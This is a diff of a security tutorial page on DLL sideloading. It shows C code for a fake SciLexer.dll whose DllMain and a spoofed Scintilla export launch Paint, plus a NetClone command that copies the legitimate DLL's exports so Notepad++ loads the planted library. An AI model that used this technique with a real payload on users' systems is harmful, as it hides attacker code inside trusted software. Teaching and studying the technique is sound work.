@@ -81,9 +81,9 @@
                             <div class="squarebox">
                                 #include &lt;windows.h&gt; //for WinExec() <br>
                                 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { <br>
-                            &emsp;WinExec("cmd.exe /C C:\\Windows\\System32\\mspaint.exe", 0);
-                            &emsp;exit(0);
-                            &emsp;return 0;
+                            &emsp;WinExec("cmd.exe /C C:\\Windows\\System32\\mspaint.exe", 0); <br>
+                            &emsp;exit(0); <br>
+                            &emsp;return 0; <br>
                             }
                             </div>
                             
@@ -99,26 +99,25 @@
                             <div class="squarebox">
                             #include &lt;windows.h&gt; //for WinExec() <br>
                             void Scintilla_DirectFunction() { <br>
-                            &emsp;WinExec("cmd.exe /C C:\\Windows\\System32\\mspaint.exe", 0);
-                            }
+                            &emsp;WinExec("cmd.exe /C C:\\Windows\\System32\\mspaint.exe", 0); <br>
+                            } <br>
                             BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { <br>
-                            &emsp;Scintilla_DirectFunction();
-                            &emsp;exit(0);
-                            &emsp;return 0;
+                            &emsp;Scintilla_DirectFunction(); <br>
+                            &emsp;exit(0); <br>
+                            &emsp;return 0; <br>
                             }
                             </div>
                             Compile the source code and generate a dll.
                             <img src="img/dllsideloading/gcccompile.jpg" class="img-fluid" width="700">
                             If I open PEStudio and check for the export, we should be able to see the function in the exports.
                             <img src="img/dllsideloading/pestudioexport2.jpg" class="img-fluid" width="900">
-                            For this case, we only have 1 function, however, if we have many functions to copy, it will become troublesome to rewrite each function on our dll. <br>
+                            For this case, we only have 1 function, however, if we have many functions to copy, it will become troublesome to rewrite each function on our dll. Moreover, some dll sideloading needs the malicious dll to have exactly the same function definition.  <br>
                             To know what functions are called by the program, check the imports on PEStudio.
                             <img src="img/dllsideloading/pestudioimport.jpg" class="img-fluid" width="900">
                             It exists a tool called "<a href="https://github.com/monoxgas/Koppeling">NetClone</a>" that can clone the exports from one DLL to another.
                             <div class="squarebox">Netclone.exe --target [MALICIOUS_DLL] --reference [LEGITIMATE_DLL] --output [NEW_DLL]</div>
-                            This tool will clone the export of the legitimate DLL to the malicious DLL, which in our case launch paint.
                             <img src="img/dllsideloading/netclone.jpg" class="img-fluid" width="900">
-                            Our new dll is called "SciLexer.dll" and has all the functions of the legitimate one. Now let's try to run Notepad++.exe. <br> <br>
+                            Our new dll called "SciLexer.dll" has all the functions of the legitimate one. Now let's try to run Notepad++.exe. <br> <br>
                             <video width="70%" style="max-width: 100%; height: auto; display: block;" muted autoplay loop>
                                 <source src="img/dllsideloading/notepad++.mp4" type="video/mp4">
                                     Your browser does not support the video tag
